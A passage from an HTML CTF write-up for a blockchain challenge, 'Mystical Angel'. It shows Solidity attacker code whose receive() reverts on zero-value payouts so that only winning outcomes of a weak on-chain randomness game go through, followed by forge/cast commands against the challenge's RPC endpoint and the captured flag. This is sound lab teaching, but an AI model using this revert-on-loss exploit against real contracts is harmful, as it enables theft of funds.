+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#ff7b72">if</span> (AngelNumber <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">1</span>) {
+</span></span><span style="display:flex;"><span>    (<span style="color:#ff7b72">bool</span> sent, ) <span style="color:#ff7b72;font-weight:bold">=</span> msg.sender.call{value<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">1</span> <span style="color:#79c0ff">ether</span>}(<span style="color:#a5d6ff">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>    require(sent, <span style="color:#a5d6ff">&#34;Failed to send Ether&#34;</span>);
+</span></span><span style="display:flex;"><span>    blessings[msg.sender] <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#a5d6ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And it&rsquo;s value is computed by generating a &ldquo;random&rdquo; number using known values.</p>
+<div class="highlight"><div style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#ff7b72">uint256</span> randomNumber <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">uint256</span>(keccak256(abi.encodePacked(seed, msg.sender, block.prevrandao, block.timestamp)));
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">uint256</span> AngelNumber <span style="color:#ff7b72;font-weight:bold">=</span> randomNumber <span style="color:#ff7b72;font-weight:bold">%</span> <span style="color:#a5d6ff">2</span>;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>But skill issue, I didn&rsquo;t managed to recompute the random value successfully.</p>
+<p>However, when getting blessed, a function call is made to msg.sender :</p>
+<div class="highlight"><div style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>(<span style="color:#ff7b72">bool</span> sent, ) <span style="color:#ff7b72;font-weight:bold">=</span> msg.sender.call{value<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">1</span> <span style="color:#79c0ff">ether</span>}(<span style="color:#a5d6ff">&#34;&#34;</span>);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And even if we are not getting blessed :</p>
+<div class="highlight"><div style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>(<span style="color:#ff7b72">bool</span> sent, ) <span style="color:#ff7b72;font-weight:bold">=</span> msg.sender.call{value<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">0</span> <span style="color:#79c0ff">ether</span>}(<span style="color:#a5d6ff">&#34;&#34;</span>);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>What is happenings is that a call to &quot;&quot; is made. It could be a call to &ldquo;function1()&rdquo; or whatever but when it&rsquo;s empty, it means that the default function when receiving ether is called which is  either &ldquo;<code>receive()</code>&rdquo; or &ldquo;<code>fallback()</code>&rdquo; :</p>
+<pre tabindex="0"><code>                 send Ether
+                      |
+           msg.data is empty?
+                /           \
+            yes             no
+             |                |
+    receive() exists?     fallback()
+        /        \
+     yes          no
+      |            |
+  receive()     fallback()
+</code></pre><p>Then, to only receive blessing we can make the difference between a blessing and not a blessing (a curse ?), which is receiving or not ether. So, we can write a <code>receive</code> function to only accept blessings :</p>
+<div class="highlight"><div style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>receive() <span style="color:#ff7b72">external</span> <span style="color:#ff7b72">payable</span> { 
+</span></span><span style="display:flex;"><span>        require(msg.value <span style="color:#ff7b72;font-weight:bold">&gt;=</span> <span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">&#34;envoie de la moula frr&#34;</span>);
+</span></span><span style="display:flex;"><span>        player.transfer(<span style="color:#ff7b72">address</span>(this).balance);  
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="../../images/memes/receive-function-money.gif" alt="receive"></p>
+<h1 id="solving">Solving</h1>
+<p>Now that&rsquo;s the receive function is ready, we can write a contract to actually which will get the blessings and make call to it with <a href="https://book.getfoundry.sh/reference/cast/">cast</a></p>
+<details>
+  <summary style="color: #F99417; cursor: pointer">Solve.sol</summary>
+  <div class="highlight"><div style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">41
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span><span style="color:#ff7b72">pragma solidity</span> <span style="color:#ff7b72;font-weight:bold">^</span><span style="color:#a5d6ff">0</span>.<span style="color:#a5d6ff">8</span>.<span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#a5d6ff">&#34;./Challenge.sol&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">contract</span> <span style="color:#f0883e;font-weight:bold">Solve</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">address</span> <span style="color:#ff7b72">payable</span> <span style="color:#ff7b72">public</span> player;
+</span></span><span style="display:flex;"><span>    Challenge <span style="color:#ff7b72">public</span> TARGET;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">event</span> <span style="color:#f0883e;font-weight:bold">Transac</span>(<span style="color:#ff7b72">address</span> sender, <span style="color:#ff7b72">uint</span> amount);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">constructor</span>(<span style="color:#ff7b72">address</span> _player, <span style="color:#ff7b72">address</span> _target) <span style="color:#ff7b72">payable</span>{
+</span></span><span style="display:flex;"><span>        player <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">payable</span>(_player);
+</span></span><span style="display:flex;"><span>        TARGET <span style="color:#ff7b72;font-weight:bold">=</span> Challenge(_target);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">function</span> <span style="color:#d2a8ff;font-weight:bold">GetBlessed</span>() <span style="color:#ff7b72">public</span> <span style="color:#ff7b72">payable</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        require(msg.value <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">1</span> <span style="color:#79c0ff">ether</span>, <span style="color:#a5d6ff">&#34;Send exactly 1 Ether!&#34;</span>);
+</span></span><span style="display:flex;"><span>        TARGET.Blessing{value<span style="color:#ff7b72;font-weight:bold">:</span> msg.value}();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">function</span> <span style="color:#d2a8ff;font-weight:bold">GetBlessings</span>() <span style="color:#ff7b72">public</span> <span style="color:#ff7b72">payable</span> <span style="color:#ff7b72">returns</span> (<span style="color:#ff7b72">uint256</span>){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">return</span> TARGET.blessings(<span style="color:#ff7b72">address</span>(this));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">function</span> <span style="color:#d2a8ff;font-weight:bold">ascend</span>() <span style="color:#ff7b72">public</span> <span style="color:#ff7b72">payable</span> {
+</span></span><span style="display:flex;"><span>        TARGET.ascend{value<span style="color:#ff7b72;font-weight:bold">:</span> msg.value}();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    receive() <span style="color:#ff7b72">external</span> <span style="color:#ff7b72">payable</span> { 
+</span></span><span style="display:flex;"><span>        require(msg.value <span style="color:#ff7b72;font-weight:bold">&gt;=</span> <span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">&#34;envoie de la moula frr&#34;</span>);
+</span></span><span style="display:flex;"><span>        player.transfer(<span style="color:#ff7b72">address</span>(this).balance);  
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<p>Deploy it and do multiple calls to <code>GetBlessed()</code> until we got to ten blessings :</p>
+<div class="highlight"><div style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>forge create --broadcast breizh/2025/blockchain/mystical-angel/Solve.sol:Solve -r https://mystical-angel-268.chall.ctf.bzh/rpc  --private-key <span style="color:#79c0ff">$PKEY</span> --constructor-args <span style="color:#79c0ff">$PLAYER</span> <span style="color:#79c0ff">$TARGET</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cast send 0xF14165Da8e14d2AFdF75a448A057D460D13b0242 -r https://mystical-angel-268.chall.ctf.bzh/rpc --value 1ether --private-key <span style="color:#79c0ff">$PKEY</span> <span style="color:#a5d6ff">&#34;GetBlessed()&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can check the number of blessings :</p>
+<div class="highlight"><div style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cast call 0xF14165Da8e14d2AFdF75a448A057D460D13b0242 -r https://mystical-angel-268.chall.ctf.bzh/rpc <span style="color:#a5d6ff">&#34;GetBlesseings()&#34;</span>
+</span></span><span style="display:flex;"><span>0x000000000000000000000000000000000000000000000000000000000000000b
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Which is 11, now we can ascend :</p>
+<div class="highlight"><div style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cast send 0xF14165Da8e14d2AFdF75a448A057D460D13b0242 -r https://mystical-angel-268.chall.ctf.bzh/rpc --private-key <span style="color:#79c0ff">$PKEY</span> <span style="color:#a5d6ff">&#34;ascend()&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And get the flag :</p>
+<p><code>BZHCTF{Ascended_L1k3_4_Mystical_Angel}</code></p>
+<h1 id="references">References</h1>
+<p><a href="https://solidity-by-example.org/fallback/">https://solidity-by-example.org/fallback/</a></p>
+</article>
+
+            </div>
+        </main>
+    </body>
+</html>
